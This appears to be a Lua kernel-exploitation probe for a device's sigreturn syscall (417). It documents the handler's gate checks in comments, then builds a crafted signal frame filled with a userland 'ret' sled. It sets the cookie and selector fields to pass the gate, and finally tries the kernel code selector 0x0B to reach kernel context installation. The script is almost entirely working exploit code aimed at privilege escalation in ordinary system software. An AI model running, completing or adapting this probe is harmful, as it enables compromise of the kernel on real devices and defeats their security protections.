-- CRASH_CLASS: HIGH
-- PROBE 813a: does sigreturn(417) reach its context installer?
--
-- 13.60 handler 0xa07280 (narg 1) copies 0x500 bytes from arg1 onto its stack,
-- then checks:
--     [rbx+0x170] < 8                              (a small index)
--     ([rbx+0x190] ^ [thread+0xf8]) & ~0x254DD5 == 0   (cookie / flags)
--     [rbx+0x188] & 3 == 3                         (a selector with RPL 3)
--     [rbx+0x1b0] == 0x10000 or 0x10002
-- before calling 0x8b0f18f0(thread, frame+0x1e0, 0x140, sanitised copy of
-- frame+0x3e0).  Offsets below are user-relative: frame+0xa0 is user+0.
-- If the cookie word is zero for this thread, [0xf0]=0 passes the gate, and
-- [0xe8]=0x0B is the kernel code selector with RPL 3 that the check accepts.
--
-- Section A is a zeroed frame (safe).  B sets every gate and every other qword
-- in the frame to one userland `ret` address, so wherever the kernel reads RIP
-- from it gets our gadget: a correct install crashes into garbage rather than
-- jumping somewhere unknown.

print("=== PROBE 813a: SIGRETURN GATE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end
    return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wb(a, v) pcall(function() memory.write_byte(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end
    return nil
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("[0] pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local sc_sigreturn = mk(417)

-- a page of 0xC3 (ret)
local gadget = memory.alloc(0x1000)
for i = 0, 0xFFF do wb(N(gadget) + i, 0xC3) end
local gv = uint64(N(gadget) + 0x800)
print("[1] ret sled = " .. string.format("0x%08X", N(gadget) + 0x800))

local frame = memory.alloc(0x600)

local function zero_frame()
    for i = 0, 0x4FF, 4 do wd(N(frame) + i, 0) end
end

print("")
print("[A] zeroed 0x500 frame")
zero_frame()
local okA, rvA = pcall(function() return sc_sigreturn(uint64(N(frame))) end)
print(string.format("    417 = %s (ok=%s) alive=%s", tostring(N(rvA)), tostring(okA), tostring(alive())))

print("")
print("[B] filled with the ret sled, gates set")
for i = 0, 0x4F8, 8 do wq(N(frame) + i, gv) end
wd(N(frame) + 0xD0, 0)          -- [rbx+0x170] index 0 (<8)
wd(N(frame) + 0xE8, 0x33)       -- [rbx+0x188] CS: user 64-bit code (RPL 3)
wd(N(frame) + 0xF0, 0)          -- [rbx+0x190] cookie word
wq(N(frame) + 0x110, uint64(0x10000))   -- [rbx+0x1b0]
wq(N(frame) + 0x118, uint64(0x20001))   -- [rbx+0x1b8]
print("    gate bytes: d0=00000000 e8=00000033 f0=00000000 110=0000000000010000 118=0000000000020001")
local okB, rvB = pcall(function() return sc_sigreturn(uint64(N(frame))) end)
print(string.format("    417 = %s (ok=%s) alive=%s", tostring(N(rvB)), tostring(okB), tostring(alive())))

if alive() then
    print("")
    print("[C] same frame, CS = 0x0B (kernel code selector, RPL 3)")
    wd(N(frame) + 0xE8, 0x0B)
    local okC, rvC = pcall(function() return sc_sigreturn(uint64(N(frame))) end)
    print(string.format("    417 = %s (ok=%s) alive=%s", tostring(N(rvC)), tostring(okC), tostring(alive())))
end

print("")
print("[*] alive pid=" .. N(native.fcall_with_rax(stub, 20)))
